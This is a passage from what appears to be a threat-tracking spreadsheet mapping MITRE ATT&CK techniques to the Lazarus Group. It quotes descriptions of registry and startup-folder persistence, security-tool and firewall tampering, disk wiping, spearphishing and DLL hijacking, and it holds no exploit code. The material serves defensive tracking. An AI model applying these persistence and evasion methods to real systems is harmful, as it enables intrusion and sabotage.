location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.  The following Registry keys can be used to set startup folder items for persistence:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>  The following Registry keys can control automatic startup of services during boot:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>  Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>  Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.  By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.  Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1547.009,Shortcut Modification,"Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1547.009_Shortcut_Modification.html,,APT Matrix Generator,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.  Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.  Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",https://attack.mitre.org/techniques/T1547/009/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1553.002,Code Signing,Defense-Evasion,Pending,alerts\Lazarus_Group\T1553.002_Code_Signing.html,,APT Matrix Generator,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.  Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)  Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ",https://attack.mitre.org/techniques/T1553/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1557.001,LLMNR/NBT-NS Poisoning and SMB Relay,"Collection, Credential-Access",Pending,alerts\Lazarus_Group\T1557.001_LLMNRNBT-NS_Poisoning_and_SMB_Relay.html,,APT Matrix Generator,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.   Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)  Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.  In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.   Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",https://attack.mitre.org/techniques/T1557/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1560,Archive Collected Data,Collection,Pending,alerts\Lazarus_Group\T1560_Archive_Collected_Data.html,,APT Matrix Generator,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.  Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",https://attack.mitre.org/techniques/T1560/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1560.002,Archive via Library,Collection,Pending,alerts\Lazarus_Group\T1560.002_Archive_via_Library.html,,APT Matrix Generator,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.  Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",https://attack.mitre.org/techniques/T1560/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1560.003,Archive via Custom Method,Collection,Pending,alerts\Lazarus_Group\T1560.003_Archive_via_Custom_Method.html,,APT Matrix Generator,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",https://attack.mitre.org/techniques/T1560/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1561.001,Disk Content Wipe,Impact,Pending,alerts\Lazarus_Group\T1561.001_Disk_Content_Wipe.html,,APT Matrix Generator,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.  Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.  To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1561/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1561.002,Disk Structure Wipe,Impact,Pending,alerts\Lazarus_Group\T1561.002_Disk_Structure_Wipe.html,,APT Matrix Generator,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.   Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.  On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)  To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",https://attack.mitre.org/techniques/T1561/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1562.001,Disable or Modify Tools,Defense-Evasion,Pending,alerts\Lazarus_Group\T1562.001_Disable_or_Modify_Tools.html,,APT Matrix Generator,"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)  Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)  Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging)   On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)  In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.  Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)  Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",https://attack.mitre.org/techniques/T1562/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1562.004,Disable or Modify System Firewall,Defense-Evasion,Pending,alerts\Lazarus_Group\T1562.004_Disable_or_Modify_System_Firewall.html,,APT Matrix Generator,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.  Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)  Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.  In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",https://attack.mitre.org/techniques/T1562/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1564.001,Hidden Files and Directories,Defense-Evasion,Pending,alerts\Lazarus_Group\T1564.001_Hidden_Files_and_Directories.html,,APT Matrix Generator,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).  On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.  Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.  Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",https://attack.mitre.org/techniques/T1564/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1566.001,Spearphishing Attachment,Initial-Access,Pending,alerts\Lazarus_Group\T1566.001_Spearphishing_Attachment.html,,APT Matrix Generator,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.  There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",https://attack.mitre.org/techniques/T1566/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1566.002,Spearphishing Link,Initial-Access,Pending,alerts\Lazarus_Group\T1566.002_Spearphishing_Link.html,,APT Matrix Generator,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.  All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.  Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)  Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)  Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing” into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)  Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",https://attack.mitre.org/techniques/T1566/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1566.003,Spearphishing via Service,Initial-Access,Pending,alerts\Lazarus_Group\T1566.003_Spearphishing_via_Service.html,,APT Matrix Generator,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.  A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",https://attack.mitre.org/techniques/T1566/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1571,Non-Standard Port,Command-And-Control,Pending,alerts\Lazarus_Group\T1571_Non-Standard_Port.html,,APT Matrix Generator,"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.  Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)",https://attack.mitre.org/techniques/T1571/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1573.001,Symmetric Cryptography,Command-And-Control,Pending,alerts\Lazarus_Group\T1573.001_Symmetric_Cryptography.html,,APT Matrix Generator,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",https://attack.mitre.org/techniques/T1573/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1574.001,DLL,"Defense-Evasion, Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1574.001_DLL.html,,APT Matrix Generator,"Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)  Specific ways DLLs are abused by adversaries include:  ### DLL Sideloading Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).  Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.  Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)  ### DLL Search Order Hijacking Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)  ### DLL Redirection Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)  ### Phantom DLL Hijacking Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)  ### DLL Substitution Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)  Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.  Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)  If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",https://attack.mitre.org/techniques/T1574/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1574.013,KernelCallbackTable,"Defense-Evasion, Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1574.013_KernelCallbackTable.html,,APT Matrix Generator,"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)  An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.  A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT 